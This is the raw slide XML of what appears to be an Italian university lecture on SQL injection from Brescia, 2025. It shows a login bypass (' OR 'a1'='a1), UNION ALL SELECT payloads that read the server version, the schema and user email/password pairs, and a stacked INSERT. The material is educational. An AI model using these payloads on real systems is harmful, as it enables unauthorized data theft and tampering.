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49"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="301" r:id="rId3"/>
    <p:sldId id="265" r:id="rId4"/>
    <p:sldId id="268" r:id="rId5"/>
    <p:sldId id="288" r:id="rId6"/>
    <p:sldId id="266" r:id="rId7"/>
    <p:sldId id="289" r:id="rId8"/>
    <p:sldId id="270" r:id="rId9"/>
    <p:sldId id="294" r:id="rId10"/>
    <p:sldId id="298" r:id="rId11"/>
    <p:sldId id="290" r:id="rId12"/>
    <p:sldId id="286" r:id="rId13"/>
    <p:sldId id="287" r:id="rId14"/>
    <p:sldId id="284" r:id="rId15"/>
    <p:sldId id="296" r:id="rId16"/>
    <p:sldId id="283" r:id="rId17"/>
    <p:sldId id="297" r:id="rId18"/>
    <p:sldId id="291" r:id="rId19"/>
    <p:sldId id="272" r:id="rId20"/>
    <p:sldId id="278" r:id="rId21"/>
    <p:sldId id="295" r:id="rId22"/>
    <p:sldId id="307" r:id="rId23"/>
    <p:sldId id="277" r:id="rId24"/>
    <p:sldId id="317" r:id="rId25"/>
    <p:sldId id="280" r:id="rId26"/>
    <p:sldId id="279" r:id="rId27"/>
    <p:sldId id="281" r:id="rId28"/>
    <p:sldId id="299" r:id="rId29"/>
    <p:sldId id="282" r:id="rId30"/>
    <p:sldId id="302" r:id="rId31"/>
    <p:sldId id="303" r:id="rId32"/>
    <p:sldId id="305" r:id="rId33"/>
    <p:sldId id="306" r:id="rId34"/>
    <p:sldId id="304" r:id="rId35"/>
    <p:sldId id="316" r:id="rId36"/>
    <p:sldId id="273" r:id="rId37"/>
    <p:sldId id="310" r:id="rId38"/>
    <p:sldId id="311" r:id="rId39"/>
    <p:sldId id="309" r:id="rId40"/>
    <p:sldId id="319" r:id="rId41"/>
    <p:sldId id="285" r:id="rId42"/>
    <p:sldId id="300" r:id="rId43"/>
    <p:sldId id="308" r:id="rId44"/>
    <p:sldId id="318" r:id="rId45"/>
    <p:sldId id="314" r:id="rId46"/>
    <p:sldId id="264" r:id="rId47"/>
    <p:sldId id="258" r:id="rId48"/>
  </p:sldIdLst>
  <p:sldSz cx="9144000" cy="5143500" type="screen16x9"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Anonymous Pro" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId50"/>
      <p:bold r:id="rId51"/>
      <p:italic r:id="rId52"/>
      <p:boldItalic r:id="rId53"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Barlow Condensed" panose="00000506000000000000" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId54"/>
      <p:bold r:id="rId55"/>
      <p:italic r:id="rId56"/>
      <p:boldItalic r:id="rId57"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Barlow Condensed Light" panose="00000406000000000000" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId58"/>
      <p:bold r:id="rId59"/>
      <p:italic r:id="rId60"/>
      <p:boldItalic r:id="rId61"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Barlow Condensed Medium" panose="00000606000000000000" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId62"/>
      <p:bold r:id="rId63"/>
      <p:italic r:id="rId64"/>
      <p:boldItalic r:id="rId65"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Barlow Condensed SemiBold" panose="00000706000000000000" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId66"/>
      <p:bold r:id="rId67"/>
      <p:italic r:id="rId68"/>
      <p:boldItalic r:id="rId69"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Comic Mono" pitchFamily="1" charset="0"/>
      <p:regular r:id="rId7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264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4.fntdata"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font1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4.fntdata"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font9.fntdata"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font17.fntdata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1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7.fntdata"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font15.fntdata"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font20.fntdata"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide7.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font2.fntdata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0.fntdata"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font1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5.fntdata"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font13.fntdata"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font2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57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font8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3.fntdata"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font11.fntdata"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font16.fntdata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font" Target="fonts/font1.fntdata"/><Relationship Id="rId55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6f0400420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6f0400420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CE46157-9DCD-CBEC-088B-D31087378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B9F94CC-34F6-A6FC-520A-59F0F2637E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1191A9A-D9C4-05C8-7E88-25D272E44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397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F9579A3-9E25-EE16-AB8A-6494447E2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9718913-2AEA-DC73-EE95-7302BC243E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7EEECA4-5D38-72C4-EA76-027493BA1B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1617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BF8CAE03-FC1F-5A79-9952-A13E5BEC1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6FEF7D9C-609A-E977-D671-DDFC4061EE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E6F24BB1-1249-AF5C-BE4B-0576AA7E0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766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AB735B9-722E-9F14-C5C7-DC5F44847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221992D1-65FF-AB13-ABAC-D9853EAE3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B6C1927-1CA5-DCE8-20A7-99F5523C96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388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B477300-AEAD-4229-7FE3-A1BFB2FF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0029057-C1DD-E01A-A16B-C9FBBF32A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68FB777-6FD9-3375-0892-501778D269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7309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C6FDCEB-FC6F-A34B-6210-DA3CD00D5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E077C32-1645-F2DB-8A11-ADFD7D4FD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07571799-A6BC-0095-E9D6-4916D178A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4315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BF65E9D9-515A-0369-9C94-654A50326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5D71BE5-A3C5-C1EB-513E-144BDC4EF6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477FEC5D-261E-D38E-1EAC-26A9E63E1B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30548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4375FD9-E6F8-01CC-90F2-02FDB7B5C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D51453E-509E-ED50-48A0-0F50E91AA6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AB6A4271-DE56-AAB0-5DFE-5DFD9F6B17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17235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7CE4F274-AB73-A195-1FED-1C9869BDF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D253373-619D-C166-42EE-B9C44C4EDC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2C09C990-C366-27CB-F619-835D027469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60932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BB6766B-D3A5-A25A-2B1A-A687858E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DE75F54-9DB9-75E5-D36F-6E04BAED3B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B5FBC3C-5CCB-791F-CF74-30BDFB1E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27068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E6D14E8-39C7-7811-2630-A65BB7307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363E8969-94E5-9EE8-D9F1-57985E911D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6AD4B74C-710F-861F-A3B9-C1F6D8D1E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18481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7702CEBB-D719-AE3F-4687-A4E1409F6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6CBFF0F-5A65-49A6-D79F-0F42EE056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F6DB8A2B-598F-A5F2-4E09-0F6E6B7319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46182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CFC5CE6-CB46-34E4-5BCC-24E1BD006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F39DAB3-7897-4133-E0B3-BB3F7BC54E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5B041AA0-DA76-8F04-C98C-567399E77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98329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6D16024-57EA-1034-FD04-BFDE48BDC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97D5F10E-081F-12A3-04CE-EEFBDF13AB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122450AB-4AC2-721F-3BA0-7CCAA8B218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92554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7631F58-7090-E297-6064-5525D03E5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7965423D-55C7-D774-148D-91AB5C5AEB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69DCF671-B4DC-80AF-20D7-74FB81B449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67056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FDA9661-4D13-AEDF-77F9-6E121F22B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4E58AB0A-8619-24FF-7F36-9C6BCC068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75864A4-8EF4-6AF9-D15E-8DFD05128F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5412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829F1C9-8C22-D6DE-690A-9F18ADE35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50F100B-6885-27FD-6CF7-D3DCB2C34F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AA8A83F4-CF4E-E195-5A9A-A7B4DEEF1B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28535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A8E1991-5385-EE36-F31F-45C59D48C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85797D6-28BD-82E2-BB85-B7AA0A3134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0F378A8D-4710-B732-5B07-CFA0DC7692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80113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316C131-8360-F031-F5C7-827ACE22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799E0BA-C120-8AE3-F766-C330D2646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49FDBE1-5FA3-5DE6-F0BC-29CBFDD920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56472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D0A1EA5-23E6-F000-6691-F5015056D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31FDCAEF-CB5B-379E-5977-701B1A97B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B985512-202D-1037-C3CD-669727EE31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02062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54C4433-D5E5-6BCB-B51E-A3330E66D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E35F1BC-9EFE-B563-DF19-909C51510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C0999D-5181-DA7F-3E8B-FC9E22BF0D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24376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1DA1BA98-ED0D-1C25-705F-9F9C652F9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F5AB67A-DC7C-7D91-22F5-A9D9F34019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406AA59-C24F-8C07-5686-B3D9EFAA7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84347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361CE7E-3A7D-5CD3-2AE4-A63D5D8A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F4B17EF-4E5E-ED52-5A87-7952FFB10C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13F3AE62-4DDA-1795-F2B5-D0EEF41A75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76276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FE7B06D-B718-BF77-83E2-4ACDB6AB2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E793C01-C29A-3036-8AB0-9BF3BAA843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EF3FBB7-B6C8-90B7-B4DA-37D40D041A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41331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E539B51-AFD4-628B-6995-2E1DA878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782C1F0-FE1F-4249-B1B2-178391995C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8F27C02C-08EF-3B0E-9C79-FF12C3171E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6846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F8F7E13-2446-F06E-F670-6BFAB099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09690F4-A2A0-E7E5-EEDE-33780E24F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5DBA049C-4BBA-15B3-0FC9-68CA95847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4041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95D62CE-E835-9D12-D443-028D6189A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D889F51-D780-4B76-EB59-9E3310EF44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A020F66-2B27-6920-49D9-2E98314C53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03038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1B9EFDD-426A-D616-1468-BFDC1B0D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05AF142E-017B-D673-C759-8412791088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EFDB43B-4DFE-3F8A-75BF-5F8C2EB1E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49087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01623F2-E7E1-443D-2A29-CBE4F5DA9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B1BB5F3-265F-75AF-4EAD-7E6C688D29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73501C9-6ACA-D074-C1CD-BF5CD3EEAA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4352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A393C12-2BE7-DC2A-E28A-A640C4FAE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20ECE4B1-F0E1-124F-B3A6-35FDF870E8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3B96D3F2-C26D-FD91-1E18-C357571427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020922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6393912-73FA-26A0-0E20-BAA652FCF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520D353-D796-3329-1028-F0DBBF4048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115FD8C-C295-214E-3396-2C2EDD8E69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00569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68101D0-04FA-7337-FB24-91A6951B2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3F591E42-46A3-2A8F-1D38-E8025B879D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C826DB33-1E53-C9C3-5C95-FF7EB8A760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29808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366DE0C8-C8E7-5F76-CAB4-E3E1043DA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785B3A2-6938-71DA-BCC3-BB82D7FFA2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B151C7A-E12B-80EA-9D8A-40B3A7B3B5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031860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7C6A6AF-A01B-5E3B-F81B-949E028D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1C16E44-6EC6-B33F-A02B-CB02C3AE3F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F8F337-7DE1-1854-0BAF-C04706A91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787728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7DB1149-E4CB-7FEB-1517-A551B50D5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C8E40AE6-B57F-54D0-2E2A-9F5C78E07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39C2FD8-0122-5768-25A4-7929F52B93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50316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396363CC-6970-756F-8E27-A63D8C9C1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ED03EBF-A3D9-6DEF-6AAB-8E2AB042EB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000EADD-7EBA-DA44-F2BF-7D3CD8F67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61029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10FDA05-D309-794B-1448-C950019C5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E905B57-6C75-64D3-6882-D52B44689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C4159158-3C56-4FEE-6871-1301127D3F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44481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0FEE6C45-E263-526A-D2C8-B916A2305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0DC05B9F-0C41-DFB5-56C0-59C3E7EE1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5799298-44ED-FE18-512A-D5A6603D3D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942959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987C4B5-9791-F752-496A-FC6655DF6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8B663E6-E656-660B-6988-A6EBAEC02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22D83DA-FB1B-9827-9253-8F7E2FECC5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818521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A4F100C-6502-1DA7-F527-EE4879D6A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4A052EDC-7CCC-17E7-A4C4-DE1D157C03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C940599D-779D-0574-000F-416EFD584D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96928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26ABB8DB-17A6-1859-2F61-9B5776819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DF8D77B4-7B1E-C71B-2553-7CEEF2B2F4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80186D76-62C8-4D3D-750D-DC379EE66D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722499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D9FDB905-8F82-4E87-CD82-1B5D5F6AD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30877F77-B7DE-DCF4-A73D-523B9E0B85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4D374612-BA40-9FB0-D4BD-989FE5EB76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17290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62815652-D1C9-7B05-6FB5-F5A00F08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010A47B2-AFE4-35AE-5ED8-31C1AF0EE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153DC11C-6B7E-B065-4E3E-E18BFB3BC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741234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6d4d7e4f0f_5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6d4d7e4f0f_5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" type="title">
  <p:cSld name="TITLE">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="D93232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Light"/>
              <a:buNone/>
              <a:defRPr sz="1600"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04950" y="1063225"/>
            <a:ext cx="2392550" cy="20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 Chiusura">
  <p:cSld name="TITLE_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="D9323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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2894224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Barlow Condensed SemiBold"/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pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Google Shape;16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10075" y="1257757"/>
            <a:ext cx="2392550" cy="2049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17;p3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4171000" y="4521000"/>
            <a:ext cx="802000" cy="145825"/>
            <a:chOff x="4171000" y="4521000"/>
            <a:chExt cx="802000" cy="145825"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="18" name="Google Shape;18;p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71000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389727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Google Shape;20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608455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827182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" name="Google Shape;22;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4136850" y="4136800"/>
            <a:ext cx="870300" cy="2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Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed"/>
              </a:rPr>
              <a:t>FOLLOW US</a:t>
            </a:r>
            <a:endParaRPr sz="1200"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2 righe" type="secHead">
  <p:cSld name="SECTION_HEADER">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="111D24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ubTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="504300" y="3194775"/>
            <a:ext cx="81354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1 riga">
  <p:cSld name="SECTION_HEADER_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="111D24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ll for Feedback">
  <p:cSld name="SECTION_HEADER_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="D93232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248625" y="2645775"/>
            <a:ext cx="8520600" cy="45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details">
  <p:cSld name="TITLE_ONLY_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt1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title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1201500"/>
            <a:ext cx="8520600" cy="3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code">
  <p:cSld name="TITLE_ONLY_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="111D24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title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1870387"/>
            <a:ext cx="8520600" cy="31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nonymous Pro"/>
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Anonymous Pro"/>
                <a:ea typeface="Anonymous Pro"/>
                <a:cs typeface="Anonymous Pro"/>
                <a:sym typeface="Anonymous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53" name="Google Shape;5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1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1473312"/>
            <a:ext cx="8433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">
  <p:cSld name="BLANK_1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5" name="Google Shape;65;p15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66" name="Google Shape;66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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2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 1">
  <p:cSld name="BLANK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16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75" name="Google Shape;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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1637250" y="2374950"/>
            <a:ext cx="57738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title" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1637250" y="2902375"/>
            <a:ext cx="5773800" cy="71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resentazione business - cover">
  <p:cSld name="CUSTOM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1673550" y="1997225"/>
            <a:ext cx="6129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1673550" y="2769797"/>
            <a:ext cx="58518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 - 2">
  <p:cSld name="CUSTOM_2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641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-2">
  <p:cSld name="CUSTOM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_4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6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4">
  <p:cSld name="CUSTOM_7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>
  <p:cSld name="CUSTOM_8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_9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 1">
  <p:cSld name="CUSTOM_9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>
  <p:cSld name="CUSTOM_10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rlow Condensed Medium"/>
              <a:buNone/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill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800"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"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png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sqlserverupdates.com/news/new-security-updates-to-fix-sql-injection-vulnerabilities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odicePlastico/BibeCatalogue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8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dirty="0"/>
              <a:t>SQL Injection crash(ed) course – Try this ONLY at home!</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600" dirty="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it-IT" sz="1600" dirty="0" err="1"/>
              <a:t>ome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it-IT" sz="1600" dirty="0"/>
              <a:t> alcune scelte di comodo in fase di sviluppo possono portare ad effetti... più che indesiderati</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Google Shape;106;p28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Alberto Turelli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Università degli Studi di Brescia</a:t>
            </a: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/>
              <a:t>Brescia, 4 novembre 2025</a:t>
            </a:r>
            <a:endParaRPr i="1"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EC36896-F088-20D9-945D-99CB4EFE1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FAC840DB-0542-C018-463E-551827295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query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua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farò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E56BAEF-7CD9-1247-163D-1BAB62A8159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7C92B92F-C172-4888-CA57-4ED85DDF0E6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'password123';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512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AB92EA55-9502-DAD9-9352-36007BE9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E1604AF-E6B1-22C1-EC71-6D0AADFE44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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meglio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>una</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua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D52658B-8CF4-C97A-3A78-FF98F2D479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1EFD27-9359-5E97-019F-99A6B00E7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7361" y="2464700"/>
            <a:ext cx="3849278" cy="171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98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472833" y="1497613"/>
            <a:ext cx="4198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 buona password…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0"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1128450" y="2182797"/>
            <a:ext cx="6887100" cy="224386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-US" sz="1600" dirty="0"/>
              <a:t>8+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>caratteri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" sz="1600" dirty="0"/>
              <a:t>Lettere minuscole e maiuscole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" sz="1600" dirty="0"/>
              <a:t>Numeri</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-330200">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Caratteri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>speciali</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Comic Mono" pitchFamily="1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C34B15A-F317-C316-64C3-D9EE5FAA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C23C0CFA-5540-B710-5F82-5A75D0F13F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72833" y="1497613"/>
            <a:ext cx="4198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 buona password…</a:t>
            </a:r>
            <a:endParaRPr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7CE21CCC-1155-3405-E6BA-06FA67896ED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0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C8A3B44-716F-09C2-B8DB-58F9FB0F0B4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82797"/>
            <a:ext cx="6887100" cy="224386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-US" sz="1600" dirty="0"/>
              <a:t>8+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>caratteri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" sz="1600" dirty="0"/>
              <a:t>Lettere minuscole e maiuscole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" sz="1600" dirty="0"/>
              <a:t>Numeri</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-330200">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Caratteri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>speciali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Ci </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>sono</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>! </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Userò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>' OR 'a1'='a1</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="00FFFF"/>
              </a:highlight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8529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5BF998F-C01B-D030-A01B-0E38EFA51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F49611F-FCAC-62B7-A7D6-A097FEB6AA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#1: WHERE poisoning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591402D-86A8-90E7-DE16-9C39D5043F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9E26F98C-8BB1-0BAD-0B79-B77710E12AB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 OR 'a1'='a1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464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3407A6A-C7DF-4A86-C32F-0A4F44AD8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3681383-D515-E609-D58C-8C9FA7F716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#1: WHERE poisoning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1A4909F3-C800-0A22-B2EE-FF23B1C50DB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E9D230D-74E2-C687-60D1-85EC7BC799D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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>Email = 'test@example.com' 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)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	OR 'a1'='a1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727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BE1A6B1-E094-ED9C-B061-FE8E89F13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505E075-430E-A8EC-14B6-1C5F76690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campi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>estratti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60C50FD-8700-3126-FC8E-3F86DA52238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09DB0031-BA3C-50E3-1199-90EDC42C10F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*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ORDER BY 1--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4498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535E5766-50FF-2563-3F1C-B40E98FE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816575F-A1F2-CC02-BE8B-F2A223969B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#2: UNION ALL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0D6E018-3A96-D35E-46AD-18E07D795DB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853F1DCA-31FB-0F18-B2F3-CBB8776A9E7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'a',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600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D62413F-EA1C-54C4-E025-71445E963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3888C5D-BAF9-437A-AFEC-0534699BC1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#2: UNION ALL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2F29C4C6-2E4B-5C23-FB9C-35592599654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E3EA41C-F190-75C0-9BF2-EDD19899950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r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> 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UNION ALL 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SELECT NULL, 'a', NULL, NULL, NULL, NULL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ORDER BY 2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2376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358444C-7853-BF1F-D289-400243612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AA0CBDAF-CF33-1CBD-CDB9-6916F8412B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versione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database server*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9E4E2DF-793D-756F-EB84-A4C93546FD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575B8E52-58D8-605A-41E3-FE9D8F667FE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r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> 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@@VERSION,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8615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BA83D64F-17F5-E9D6-41B9-FA15B1CEC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895BD0FD-4C79-1774-8867-3624FB85B5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versione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database server**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1E02F20C-6A13-65F6-8385-77A7E5DFBDF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5968E61-690C-1F5F-7CE1-A222F3C4A2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VERSION(),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000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FF40531-5418-D238-DA56-5FBD9EE74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7786EA0-FB50-F4E4-40B4-ED11F90D9F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A85D4787-33B1-E75D-99CB-1D54A1200C5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2A16D06-AE54-6BF4-ADE9-45C93D634A3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CONCAT(S.name, '.', T.name, '.', C.name),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sys.columns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C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sys.tables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sys.schemas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615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29F90C1E-D30E-F4C0-A1D8-B6F600621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3093E38A-769C-ABEC-65B9-0739E426C3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51444B20-591C-53CF-56FB-30B446DF99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A2401073-FB78-3332-A168-2AFD1937588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CONCAT(C.TABLE_SCHEMA, '.', C.TABLE_NAME, '.', C.COLUMN_NAME), NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS C WHERE C.TABLE_SCHEMA &lt;&gt; N'INFORMATION_SCHEMA' ORDER BY C.TABLE_NAME, C.ORDINAL_POSITION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0358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4361B430-5B6A-C8D7-8A70-FFCAC48A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202F62D-4E1A-92ED-8345-1E40DDE88C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B9BD06F-8ADA-8BDC-CD8E-740CE39B1F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949810-8240-554C-A042-21CCCBF25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6890" y="1883207"/>
            <a:ext cx="1410219" cy="27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5389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C1BFF0C3-3F74-F29F-3C84-30C80F33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BCE8877-1789-401D-4C57-89BD6D1AEA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contenuto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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tabella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9BDA5062-7C55-0620-9D10-A9A5014DEBA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9F8B238D-F1EE-13CD-4106-2743006F5D3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CONCAT(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U.Email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'/',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U.Password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U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71384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796AD8C-2551-245C-DE9B-3C771744E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7295EA24-FC0F-702F-52C6-C2547316E2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#3: query concatenating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EC7427D-4845-0F2A-5CB7-1DF8933DEA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59C7CD34-6206-4422-B95D-231F419789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 (Email, Password, FirstName, LastName) VALUES ('pippo@disney.com', 'clarabella', 'Pippo', 'De''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Pippis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');--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76438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C2FC190-071E-2A58-64FF-70D28413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2A00334-F6A3-956A-9C17-E3E0CE6A9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#3: query concatenating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6BD36E1-B897-AE2D-16DE-15A41218908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6D8BA38-3B6E-49DE-B6C8-430535F532D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 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 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';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INSERT INTO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 (Email, Password, FirstName, LastName) VALUES ('pippo@disney.com', 'clarabella', 'Pippo', 'De''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Pippis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');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--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4240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647F138-F553-A411-2A55-5FF99867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A1F885EE-699A-FF18-A7CB-935398C125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Inserimento</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dati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8B3FAB75-BBF2-E07A-7B3A-D7E6575D567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F3669C20-83E0-43F2-A4D7-EA2D0F7ACC2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(Title,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Result,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 SELECT DISTINCT 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28,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788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DBFA3DA-798F-1FB8-B8D9-01B1F3B13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5209672-7197-9AAA-4D16-02CEB0E6FC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Inserimento</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
